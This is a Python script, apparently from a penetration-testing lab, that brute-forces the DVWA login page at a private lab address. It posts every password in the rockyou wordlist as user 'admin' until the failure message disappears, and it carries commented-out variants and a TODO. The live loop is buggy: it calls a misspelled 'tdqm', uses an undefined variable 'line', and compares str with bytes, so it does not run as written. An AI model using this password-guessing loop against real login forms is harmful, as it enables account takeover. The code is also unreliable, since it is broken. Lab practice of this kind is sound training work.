#!/usr/bin/env python

import requests
from tqdm import tqdm   

# import the target url method
target_url = "http://10.0.2.5/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

# response.content
denied = "Login failed"

# open the wordlist file and iterate through each word, stripping the words of whitespace chars
# once the password is found, it will be displayed and the program will terminate
wordlist = ("/home/Mitch/Documents/Password_Cracking/Wordlists/rockyou.txt")

# count the number of words in this wordlist
num_words = len(list(open(wordlist, "rb")))

# print the total number of passwords
print("Total passwords to test:", num_words)

with open(wordlist, "rb") as wordlist:
    for word in tdqm(wordlist, total = num_words, unit = "word"):   
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if denied not in response.content:
            print("[+] Found the password --> " + word)
            exit()

# with open(wordlist, "r") as wordlist_file:
#     for line in wordlist_file:
#         word = line.strip()
#         data_dict["password"] = word
#         response = requests.post(target_url, data = data_dict)
#         if denied not in response.content:
#             print("[+] Found the password --> " + word)
#             exit()


# with open(wordlist, "rb") as wordlist:
#     for word in tdqm(wordlist, total = num_words, unit = "word"):   
#         try:
#             pwd = word.strip()
#         except:
#             continue
#         else:
#             print("[+] Password found:", word.decode().strip())
#             exit(0)
# print("[!] Password not found. Try another wordlist.")

# TODO: update the current status of the password check, to let the user know the the program is still running
# def report(self, blocknum, blocksize, totalsize):
#     readsofar = blocknum * blocksize
#     if totalsize > 0:
#         percent = readsofar * 100 / totalsize
#         self.progress.setValue(int(percent))

# If the program gets this far, it has not found the password in the wordlist
print("[!] Password not found. Try another wordlist")